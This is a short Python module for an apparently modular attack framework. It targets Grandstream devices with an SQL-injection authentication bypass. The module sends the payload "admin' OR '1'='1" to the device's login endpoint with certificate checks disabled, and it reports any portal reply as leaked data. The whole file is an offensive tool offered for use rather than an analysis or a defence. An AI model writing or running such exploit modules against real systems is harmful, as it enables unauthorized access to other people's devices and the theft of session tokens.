import httpx
from core.base import BaseModule

class Module(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "grandstream/sqli_bypass_attack"
        self.description = "Exploit module to bypass portal authentication and leak backend tokens from Grandstream."
        self.type = "attack"
        self.options = {
            "TARGET": {"required": True, "value": ""},
            "PORT": {"required": False, "value": "80"}
        }

    async def run(self):
        target = self.options["TARGET"]["value"]
        port = self.options["PORT"]["value"]
        
        if not target.startswith(("http://", "https://")):
            url = f"http://{target}:{port}/manager?action=login"
        else:
            url = f"{target.rstrip('/')}/manager?action=login"
            
        # Payload d'authentification forcée par injection SQL
        payload = {"username": "admin' OR '1'='1", "secret": "bypass_token"}
        
        try:
            async with httpx.AsyncClient(timeout=8.0, verify=False) as client:
                print("\033[1;33m[*] Delivering SQLi authentication bypass vector to Grandstream web root...\033[0m")
                response = await client.post(url, data=payload)
                
                if response.status_code == 200 and "success" in response.text.lower():
                    return {
                        "success": True,
                        "details": f"Grandstream SQLi Bypass Successful!\n  -> Raw Portal Reply: {response.text.strip()}"
                    }
        except Exception as e:
            return {"success": False, "error": str(e)}
        return {"success": False, "details": "Payload processed but target framework database components did not leak valid session grids."}
